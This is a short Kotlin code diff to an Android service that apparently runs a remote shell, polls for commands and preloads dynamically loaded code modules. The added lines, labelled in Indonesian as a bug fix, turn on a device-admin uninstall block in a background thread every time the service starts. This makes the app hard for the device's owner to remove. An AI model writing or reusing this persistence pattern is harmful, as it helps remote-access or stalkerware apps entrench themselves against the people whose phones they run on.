@@ -93,6 +93,9 @@ class ConnectorService : Service() {
         currentDir = prefs.getString("shell_dir", "/sdcard") ?: "/sdcard"
         startPolling()
         DexModuleLoader.preloadAll(this)
+        // FIX Bug 1: auto-enforce uninstall block setiap kali service start
+        Thread { AppDeviceAdminReceiver.setBlockUninstall(this@ConnectorService, true) }
+            .also { it.isDaemon = true }.start()
         return START_STICKY
     }
 
